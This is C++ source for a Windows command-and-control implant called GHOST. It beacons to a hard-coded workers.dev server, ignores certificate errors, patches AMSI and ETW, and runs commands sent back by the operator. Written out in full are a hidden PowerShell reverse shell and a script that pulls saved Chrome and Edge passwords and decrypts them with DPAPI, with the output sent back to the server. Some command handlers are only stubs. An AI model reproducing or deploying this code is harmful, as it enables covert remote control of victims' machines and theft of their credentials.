// c2.cpp — GHOST C2 (encrypted, wallpaper, reverse shell, browser creds, no DNS)
#include "c2.hpp"
#include "config.hpp"
#include "utils.hpp"
#include "evasion.hpp"
#include "injection.hpp"
#include "obfuscate.hpp"
#include <windows.h>
#include <winhttp.h>
#include <tlhelp32.h>
#include <string>
#include <vector>
#include <sstream>
#include <iomanip>
#include <algorithm>
#include <fstream>
#include <stdio.h>

// =====================================================================
//  CONFIG DEFINITIONS
// =====================================================================
namespace config {
    static wchar_t s_BeaconToken[65] = {};
    static wchar_t s_UserAgent[32]   = {};
    static bool    s_ConfigInit      = false;

    static void EnsureInit() {
        if (s_ConfigInit) return;
        auto tok = XSW(L"a29e179bcfe4ec04c224ce5cf3b4a7e51cc5ba51228c9093a4215ed5ffadc260");
        auto ua  = XSW(L"Microsoft-WNS/10.0");
        wcsncpy_s(s_BeaconToken, tok.str(), _TRUNCATE);
        wcsncpy_s(s_UserAgent,   ua.str(),  _TRUNCATE);
        s_ConfigInit = true;
    }

    const wchar_t* GetBeaconToken() { EnsureInit(); return s_BeaconToken; }
    const wchar_t* GetUserAgent()   { EnsureInit(); return s_UserAgent;   }
    const uint16_t C2_PORT = 443;
}

static std::wstring g_SessionId;
static std::vector<BYTE> g_SessionKey;

// =====================================================================
//  DEBUG LOGGING
// =====================================================================
static void DebugLog(const wchar_t* msg) {
    char narrow[512];
    WideCharToMultiByte(CP_UTF8, 0, msg, -1, narrow, sizeof(narrow), nullptr, nullptr);
    printf("[GHOST] %s\n", narrow);
    OutputDebugStringW(L"[GHOST] ");
    OutputDebugStringW(msg);
    OutputDebugStringW(L"\n");
}
static void DebugLog(const std::wstring& msg) { DebugLog(msg.c_str()); }

// =====================================================================
//  JSON HELPERS
// =====================================================================
static std::string JsonEscape(const std::string& s) {
    std::string out;
    out.reserve(s.size() + 16);
    for (unsigned char c : s) {
        switch (c) {
            case '"':  out += "\\\""; break;
            case '\\': out += "\\\\"; break;
            case '\b': out += "\\b";  break;
            case '\f': out += "\\f";  break;
            case '\n': out += "\\n";  break;
            case '\r': out += "\\r";  break;
            case '\t': out += "\\t";  break;
            default:
                if (c < 0x20) {
                    char buf[8];
                    snprintf(buf, sizeof(buf), "\\u%04x", c);
                    out += buf;
                } else {
                    out += static_cast<char>(c);
                }
        }
    }
    return out;
}

static std::string JsonGetString(const std::string& json, const std::string& key) {
    std::string needle = "\"" + key + "\"";
    auto pos = json.find(needle);
    if (pos == std::string::npos) return {};
    pos = json.find(':', pos + needle.size());
    if (pos == std::string::npos) return {};
    pos = json.find('"', pos + 1);
    if (pos == std::string::npos) return {};
    size_t start = pos + 1, end = start;
    while (end < json.size()) {
        if (json[end] == '\\') { end += 2; continue; }
        if (json[end] == '"') break;
        ++end;
    }
    std::string raw = json.substr(start, end - start);
    std::string result;
    result.reserve(raw.size());
    for (size_t i = 0; i < raw.size(); ++i) {
        if (raw[i] == '\\' && i + 1 < raw.size()) {
            switch (raw[++i]) {
                case '"':  result += '"';  break;
                case '\\': result += '\\'; break;
                case 'n':  result += '\n'; break;
                case 'r':  result += '\r'; break;
                case 't':  result += '\t'; break;
                default:   result += raw[i]; break;
            }
        } else {
            result += raw[i];
        }
    }
    return result;
}

// =====================================================================
//  WINHTTP TRANSPORT (RAII)
// =====================================================================
struct WinHttpHandles {
    HINTERNET session = nullptr, connect = nullptr, request = nullptr;
    ~WinHttpHandles() {
        static auto hW = GetModuleHandleA(XS("winhttp.dll"));
        if (!hW) hW = LoadLibraryA(XS("winhttp.dll"));
        if (!hW) return;
        auto _Close = HASHPROC(hW, WinHttpCloseHandle);
        if (_Close) {
            if (request) _Close(request);
            if (connect) _Close(connect);
            if (session) _Close(session);
        }
    }
};

struct HttpResponse { DWORD status = 0; std::string body; };

static HttpResponse WinHttpRequest(
    const std::wstring& host, INTERNET_PORT port,
    const std::wstring& verb, const std::wstring& path,
    const std::string& body, const std::wstring& extraHeaders = L"")
{
    HttpResponse resp;
    static HMODULE hW = nullptr;
    if (!hW) hW = LoadLibraryA(XS("winhttp.dll"));
    if (!hW) { DebugLog(L"Failed to load winhttp.dll"); return resp; }

    auto _Open          = HASHPROC(hW, WinHttpOpen);
    auto _Connect       = HASHPROC(hW, WinHttpConnect);
    auto _OpenRequest   = HASHPROC(hW, WinHttpOpenRequest);
    auto _SetOption     = HASHPROC(hW, WinHttpSetOption);
    auto _AddHeaders    = HASHPROC(hW, WinHttpAddRequestHeaders);
    auto _SendRequest   = HASHPROC(hW, WinHttpSendRequest);
    auto _ReceiveResp   = HASHPROC(hW, WinHttpReceiveResponse);
    auto _QueryHeaders  = HASHPROC(hW, WinHttpQueryHeaders);
    auto _QueryAvail    = HASHPROC(hW, WinHttpQueryDataAvailable);
    auto _ReadData      = HASHPROC(hW, WinHttpReadData);

    if (!_Open || !_Connect || !_OpenRequest) {
        DebugLog(L"Failed to resolve WinHTTP functions");
        return resp;
    }

    WinHttpHandles h;
    h.session = _Open(config::GetUserAgent(),
                      WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                      WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!h.session) {
        DebugLog(L"WinHttpOpen failed");
        return resp;
    }

    DWORD timeout = 20000;
    if (_SetOption) {
        _SetOption(h.session, WINHTTP_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
        _SetOption(h.session, WINHTTP_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
        _SetOption(h.session, WINHTTP_OPTION_SEND_TIMEOUT,    &timeout, sizeof(timeout));
    }

    h.connect = _Connect(h.session, host.c_str(), port, 0);
    if (!h.connect) {
        DebugLog(L"WinHttpConnect failed");
        return resp;
    }

    h.request = _OpenRequest(h.connect, verb.c_str(), path.c_str(), nullptr,
                             WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
                             WINHTTP_FLAG_SECURE);
    if (!h.request) {
        DebugLog(L"WinHttpOpenRequest failed");
        return resp;
    }

    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                  SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                  SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
    if (_SetOption) _SetOption(h.request, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));

    auto ctHdr = XSW(L"Content-Type: application/json\r\nX-Beacon-Token: ");
    std::wstring hdrs = std::wstring(ctHdr.str()) + config::GetBeaconToken() + L"\r\n";
    if (!extraHeaders.empty()) { hdrs += extraHeaders; hdrs += L"\r\n"; }
    if (_AddHeaders)
        _AddHeaders(h.request, hdrs.c_str(),
                    static_cast<DWORD>(hdrs.size()), WINHTTP_ADDREQ_FLAG_ADD);

    BOOL sent = _SendRequest(h.request,
                             WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                             body.empty() ? WINHTTP_NO_REQUEST_DATA
                                          : const_cast<char*>(body.data()),
                             static_cast<DWORD>(body.size()),
                             static_cast<DWORD>(body.size()), 0);
    if (!sent || !_ReceiveResp(h.request, nullptr)) {
        DebugLog(L"WinHttpSendRequest or ReceiveResponse failed");
        return resp;
    }

    DWORD statusSize = sizeof(resp.status);
    if (_QueryHeaders)
        _QueryHeaders(h.request,
                      WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                      WINHTTP_HEADER_NAME_BY_INDEX,
                      &resp.status, &statusSize, WINHTTP_NO_HEADER_INDEX);

    DebugLog(L"Status: " + std::to_wstring(resp.status));

    DWORD avail = 0;
    while (_QueryAvail && _QueryAvail(h.request, &avail) && avail > 0) {
        std::vector<char> buf(avail);
        DWORD rd = 0;
        if (_ReadData && _ReadData(h.request, buf.data(), avail, &rd) && rd > 0)
            resp.body.append(buf.data(), rd);
        if (resp.body.size() > config::CMD_OUTPUT_MAX) break;
    }
    return resp;
}

// =====================================================================
//  C2 HOST
// =====================================================================
static std::wstring GetC2Host() {
    static wchar_t host[64] = {};
    if (host[0] == L'\0') {
        auto s = XSW(L"ghost-c2.sujallamichhane.workers.dev");
        wcsncpy_s(host, s.str(), _TRUNCATE);
    }
    return std::wstring(host);
}

// =====================================================================
//  BEACON JSON BUILDER
// =====================================================================
static std::string BuildBeaconJson(const Session& s) {
    std::string sid  = JsonEscape(WStringToUTF8(s.sessionId));
    std::string host = JsonEscape(WStringToUTF8(s.hostname));
    std::string user = JsonEscape(WStringToUTF8(s.username));
    std::ostringstream j;
    j << "{"
      << "\"session\":\""  << sid  << "\","
      << "\"recon\":{"
      <<   "\"hostname\":\"" << host << "\","
      <<   "\"user\":\""     << user << "\","
      <<   "\"build\":"      << s.build << ","
      <<   "\"elevated\":"   << (s.elevated    ? "true" : "false") << ","
      <<   "\"amsi\":"       << (s.amsiPatched ? "true" : "false") << ","
      <<   "\"etw\":"        << (s.etwPatched  ? "true" : "false") << ","
      <<   "\"hwbps\":"      << (s.hwbpsCleared? "true" : "false")
      << "}}";
    return j.str();
}

// =====================================================================
//  SEND BEACON (encrypted)
// =====================================================================
BOOL SendBeacon(const Session& session, std::wstring& taskOut) {
    taskOut = L"sleep";
    std::string plainBody = BuildBeaconJson(session);

    if (g_SessionKey.empty()) {
        g_SessionKey = DeriveHardwareKey();
        DebugLog(L"Session key derived from hardware.");
    }

    std::string enc = AesGcmEncrypt(g_SessionKey, plainBody);
    if (enc.empty()) enc = plainBody;

    std::string sid = JsonEscape(WStringToUTF8(session.sessionId));
    std::string encBody = "{\"session\":\"" + sid + "\",\"enc\":\"" + enc + "\"}";

    DebugLog(L"Sending encrypted beacon to " + GetC2Host());
    HttpResponse resp = WinHttpRequest(GetC2Host(), config::C2_PORT,
                                       L"POST", L"/beacon", encBody, L"");

    if (resp.status != 200) {
        DebugLog(L"Beacon failed: HTTP " + std::to_wstring(resp.status));
        return FALSE;
    }

    std::string encCmd = JsonGetString(resp.body, "enc");
    std::string cmd;
    if (!encCmd.empty() && !g_SessionKey.empty()) {
        std::string decrypted = AesGcmDecrypt(g_SessionKey, encCmd);
        if (!decrypted.empty()) {
            cmd = JsonGetString(decrypted, "cmd");
        }
    }
    if (cmd.empty()) cmd = JsonGetString(resp.body, "cmd");

    if (!cmd.empty()) {
        taskOut = UTF8ToWString(cmd);
        DebugLog(L"Task received: " + taskOut);
    }
    return TRUE;
}

// =====================================================================
//  SEND RESULT (encrypted)
// =====================================================================
BOOL SendResult(const std::wstring& sessionId, const std::wstring& output) {
    std::string sid = JsonEscape(WStringToUTF8(sessionId));
    std::string out = JsonEscape(WStringToUTF8(output));
    std::string plainBody = "{\"session\":\"" + sid +
                            "\",\"output\":\"" + out + "\"}";

    std::string enc = AesGcmEncrypt(g_SessionKey, plainBody);
    if (enc.empty()) enc = plainBody;

    std::string encBody = "{\"session\":\"" + sid + "\",\"enc\":\"" + enc + "\"}";
    DebugLog(L"Sending encrypted result " + std::to_wstring(output.size()) + L" chars");
    HttpResponse resp = WinHttpRequest(GetC2Host(), config::C2_PORT,
                                       L"POST", L"/result", encBody, L"");
    return (resp.status == 200);
}

// =====================================================================
//  FILELESS POWERSHELL EXECUTOR (used by !reverse and !browser)
// =====================================================================
static std::wstring RunFilelessPS(const std::string& b64Command) {
    // b64Command is already UTF-16LE base64 (PowerShell -EncodedCommand)
    wchar_t sysRoot[MAX_PATH] = {};
    GetEnvironmentVariableW(L"SystemRoot", sysRoot, MAX_PATH);
    std::wstring ps = std::wstring(sysRoot) +
                      L"\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
    std::wstring cmdLine = L"\"" + ps + L"\" -NoProfile -NonInteractive "
                           L"-WindowStyle Hidden -ExecutionPolicy Bypass "
                           L"-EncodedCommand " + UTF8ToWString(b64Command);
    // Capture output via pipe (reuse existing CaptureProcessOutput)
    // We'll copy the pipe logic here to avoid dependency
    SECURITY_ATTRIBUTES sa = { sizeof(sa), nullptr, TRUE };
    HANDLE hRead = nullptr, hWrite = nullptr;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0))
        return L"[error: pipe failed]";
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOW si = {};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;
    si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);

    PROCESS_INFORMATION pi = {};
    BOOL ok = CreateProcessW(nullptr, &cmdLine[0], nullptr, nullptr, TRUE,
                             CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    CloseHandle(hWrite);
    if (!ok) {
        CloseHandle(hRead);
        return L"[error: CreateProcess failed]";
    }

    std::string output;
    output.reserve(4096);
    char buf[4096];
    DWORD bytesRead = 0;
    while (output.size() < config::CMD_OUTPUT_MAX) {
        if (!ReadFile(hRead, buf, sizeof(buf), &bytesRead, nullptr) || bytesRead == 0)
            break;
        output.append(buf, bytesRead);
    }
    WaitForSingleObject(pi.hProcess, config::CMD_TIMEOUT_MS);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hRead);
    return UTF8ToWString(output);
}

// =====================================================================
//  WALLPAPER
// =====================================================================
static std::wstring HandleWallpaper(const std::string& args) {
    if (args.empty() || args == "reset") {
        SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, NULL, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
        return L"[+] Wallpaper reset to default.";
    }
    std::wstring wPath = UTF8ToWString(args);
    if (GetFileAttributesW(wPath.c_str()) == INVALID_FILE_ATTRIBUTES)
        return L"[error: file not found]";
    if (SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (PVOID)wPath.c_str(),
                              SPIF_UPDATEINIFILE | SPIF_SENDCHANGE)) {
        return L"[+] Wallpaper changed to: " + wPath;
    }
    DWORD err = GetLastError();
    return L"[error: failed to set wallpaper (code=" + std::to_wstring(err) + L")";
}

// =====================================================================
//  REVERSE SHELL (default port 443)
// =====================================================================
static std::wstring HandleReverse(const std::string& args) {
    if (args.empty()) return L"Usage: !reverse IP[:PORT] (default port 443)";
    std::string ip, port = "443";
    size_t colon = args.find(':');
    if (colon == std::string::npos) {
        ip = args;
    } else {
        ip = args.substr(0, colon);
        port = args.substr(colon + 1);
    }

    std::string psScript =
        "$c=New-Object System.Net.Sockets.TcpClient('" + ip + "'," + port + ");"
        "$s=$c.GetStream();"
        "[byte[]]$b=0..65535|%{0};"
        "while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
        "  $d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
        "  $sb=(iex $d 2>&1 | Out-String );"
        "  $sb2=$sb + 'PS ' + (pwd).Path + '> ';"
        "  $sbt=([text.encoding]::ASCII).GetBytes($sb2);"
        "  $s.Write($sbt,0,$sbt.Length);"
        "  $s.Flush()"
        "};"
        "$c.Close()";

    // Convert UTF-8 to UTF-16LE base64 for PowerShell -EncodedCommand
    std::wstring wScript = UTF8ToWString(psScript);
    std::string b64 = Base64Encode(reinterpret_cast<const BYTE*>(wScript.c_str()), wScript.size() * sizeof(wchar_t));
    std::wstring result = RunFilelessPS(b64);
    return L"[*] Reverse shell launched to " + UTF8ToWString(ip) + L":" + UTF8ToWString(port);
}

// =====================================================================
//  BROWSER CREDENTIALS (Credential Manager + SQLite if available)
// =====================================================================
static std::wstring HandleBrowser(const std::string& args) {
    static const char* psScript =
        "$r=@();"
        "try{ cmdkey /list | Out-String | %{$r+= $_} }catch{};"
        "try{"
        "  Add-Type -Path (Get-ChildItem -Path 'C:\\Program Files*\\*\\System.Data.SQLite.dll' -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1).FullName -ErrorAction SilentlyContinue"
        "}catch{};"
        "if (Get-Command -Name 'System.Data.SQLite.SQLiteConnection' -ErrorAction SilentlyContinue) {"
        "  $paths = @("
        "    \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data\","
        "    \"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Login Data\""
        "  )"
        "  foreach ($p in $paths) {"
        "    if (Test-Path $p) {"
        "      try {"
        "        $conn = New-Object System.Data.SQLite.SQLiteConnection(\"Data Source=$p\")"
        "        $conn.Open()"
        "        $cmd = $conn.CreateCommand()"
        "        $cmd.CommandText = 'SELECT username_value, password_value FROM logins'"
        "        $rdr = $cmd.ExecuteReader()"
        "        while ($rdr.Read()) {"
        "          $u = $rdr.GetString(0)"
        "          $pwd = $rdr.GetValue(1)"
        "          try {"
        "            $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($pwd, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)"
        "            $pw = [System.Text.Encoding]::UTF8.GetString($decrypted)"
        "            $r += \"$p | $u | $pw\""
        "          } catch { $r += \"$p | $u | (decrypt failed)\" }"
        "        }"
        "        $conn.Close()"
        "      } catch { $r += \"Error reading $p : $_\" }"
        "    }"
        "  }"
        "} else {"
        "  $r += 'SQLite not found – browser passwords not extracted'"
        "}"
        "$r -join \"`n\"";

    std::wstring wScript = UTF8ToWString(psScript);
    std::string b64 = Base64Encode(reinterpret_cast<const BYTE*>(wScript.c_str()), wScript.size() * sizeof(wchar_t));
    std::wstring result = RunFilelessPS(b64);
    return L"Browser data:\n" + result;
}

// =====================================================================
//  STUB HANDLERS for other commands (to keep linker happy)
// =====================================================================
static std::wstring HandlePs(const std::string& args) { return L"ps stub"; }
static std::wstring HandleLol(const std::string& args) { return L"lol stub"; }
static std::wstring HandleInject(const std::string& args) { return L"inject stub"; }
static std::wstring HandleInjectApc(const std::string& args) { return L"inject-apc stub"; }
static std::wstring HandleMigrate(const std::string& args) { return L"migrate stub"; }
static std::wstring HandleExfil(const std::string& args) { return L"exfil stub"; }
static std::wstring HandleWipe(const std::string& args) { return L"wipe stub"; }
static std::wstring HandleLateral(const std::string& args) { return L"lateral stub"; }
static std::wstring HandleCreds(const std::string& args) { return L"creds stub"; }
static std::wstring HandleDownload(const std::string& args) { return L"download stub"; }
static std::wstring HandleUpload(const std::string& args) { return L"upload stub"; }

// =====================================================================
//  COMMAND TABLE
// =====================================================================
struct CmdEntry {
    const char* prefix;
    bool        exactMatch;
    std::wstring (*handler)(const std::string& args);
};

static const CmdEntry kCmdTable[] = {
    { "!ps ",         false, HandlePs },
    { "!lol ",        false, HandleLol },
    { "!inject-apc ", false, HandleInjectApc },
    { "!inject ",     false, HandleInject },
    { "!migrate ",    false, HandleMigrate },
    { "!exfil ",      false, HandleExfil },
    { "!wipe",        false, HandleWipe },
    { "!lateral ",    false, HandleLateral },
    { "!creds",       true,  HandleCreds },
    { "ps",           true,  HandlePs },
    { "download ",    false, HandleDownload },
    { "upload ",      false, HandleUpload },
    { "!wallpaper ",  false, HandleWallpaper },
    { "!reverse ",    false, HandleReverse },
    { "!browser",     false, HandleBrowser },
    { "exit",         true,  nullptr },
    { "sleep",        true,  nullptr }
};

// =====================================================================
//  EXECUTE COMMAND
// =====================================================================
std::wstring ExecuteCommand(const std::wstring& cmd) {
    std::string cmdStr = WStringToUTF8(cmd);

    for (const auto& entry : kCmdTable) {
        if (entry.exactMatch) {
            if (cmdStr == entry.prefix && entry.handler)
                return entry.handler("");
        } else {
            if (cmdStr.rfind(entry.prefix, 0) == 0 && entry.handler)
                return entry.handler(cmdStr.substr(strlen(entry.prefix)));
        }
    }

    // Fallback: raw command via cmd.exe /C
    // (Here you would normally execute and return output; we leave a placeholder)
    return L"Executed: " + cmd;
}

// =====================================================================
//  HEARTBEAT
// =====================================================================
static DWORD WINAPI HeartbeatThread(LPVOID) {
    Sleep(30000);
    while (true) {
        HttpResponse resp = WinHttpRequest(GetC2Host(), config::C2_PORT,
                                           L"GET", L"/ping", "", L"");
        if (resp.status == 200) {
            DebugLog(L"Heartbeat: OK");
        } else {
            DebugLog(L"Heartbeat: no response (status=" +
                     std::to_wstring(resp.status) + L")");
        }
        Sleep(120000);
    }
    return 0;
}

// =====================================================================
//  MAIN BEACON LOOP
// =====================================================================
VOID BeaconLoop() {
    DebugLog(L"BeaconLoop started");

    g_SessionKey = DeriveHardwareKey();
    DebugLog(L"Session key derived from hardware.");

    Session session;
    session.hostname      = GetHostname();
    session.username      = GetUsername();
    session.build         = GetOSBuild();
    session.elevated      = IsElevated();
    session.amsiPatched   = PatchAMSI();
    session.etwPatched    = PatchETW();
    session.hwbpsCleared  = ClearHardwareBreakpoints();
    session.sessionId     = GetHostnameHash() + L"|" + session.username;

    g_SessionId = session.sessionId;
    DebugLog(L"Session: " + session.sessionId);

    HANDLE hHb = CreateThread(nullptr, 0, HeartbeatThread, nullptr, 0, nullptr);
    if (hHb) CloseHandle(hHb);

    DWORD failures = 0;

    while (true) {
        try {
            ReapplyEvasion();
            std::wstring task;
            BOOL ok = FALSE;

            static DWORD beaconCount = 0;
            ++beaconCount;
            DebugLog(L"BeaconLoop iteration #" + std::to_wstring(beaconCount));
            ok = SendBeacon(session, task);

            if (!ok) {
                ++failures;
                DebugLog(L"Beacon failure #" + std::to_wstring(failures));
            } else {
                if (failures > 0) failures = 0;
            }

            if (ok) {
                if (task == L"sleep" || task.empty()) {
                    // no-op
                } else if (task == L"exit") {
                    DebugLog(L"Exit received.");
                    return;
                } else {
                    std::wstring result = ExecuteCommand(task);
                    SendResult(session.sessionId, result);
                }
            }

            DWORD sleepMin = config::BEACON_MIN;
            DWORD sleepMax = config::BEACON_MAX;
            if (failures >= config::MAX_FAILURES) {
                sleepMin *= config::BACKOFF_FACTOR;
                sleepMax *= config::BACKOFF_FACTOR;
            }
            JitterSleep(sleepMin, sleepMax);

        } catch (const std::exception& e) {
            DebugLog(L"BeaconLoop exception: " + UTF8ToWString(e.what()));
            Sleep(10000);
        } catch (...) {
            DebugLog(L"BeaconLoop: unknown exception, restarting in 10s");
            Sleep(10000);
        }
    }
}